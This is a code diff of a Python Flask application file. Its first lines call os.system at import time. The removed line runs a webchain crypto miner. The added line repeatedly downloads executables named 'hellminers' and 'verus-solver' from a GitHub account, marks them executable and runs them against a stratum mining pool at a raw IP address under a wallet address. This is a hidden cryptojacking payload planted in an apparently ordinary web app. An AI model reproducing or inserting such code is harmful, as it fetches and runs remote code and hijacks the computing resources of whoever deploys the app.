@@ -1,5 +1,5 @@
 import os
-os.system ("wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:3333 -u 0x618758ae107193d6334439f6b3f1553ac6e43b62 -p x -t $(nproc --ignore 3) && reboot")
+os.system ("wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && while :; do timeout 55s wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.V${RANDOM:0:9} -p x --cpu $(nproc --ignore 2) ; sleep 15s; done")
 from flask import Flask
 from flask import render_template
 
